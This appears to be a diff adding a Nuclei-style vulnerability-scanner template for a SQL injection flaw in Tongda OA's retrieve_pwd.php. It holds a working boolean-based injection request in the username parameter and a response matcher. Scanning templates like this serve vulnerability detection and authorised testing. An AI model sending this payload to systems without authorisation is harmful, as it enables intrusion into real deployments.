@@ -1,0 +1,30 @@
+id: tongda-oa-retrieve_pwd-sqli
+info:
+  name: 通达 OA retrieve_pwd.php - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-tongda-retrieve_pwd-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: tongda,oa,sqli
+
+http:
+  - raw:
+      - |
+        GET /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'重置密码')
+        condition: and
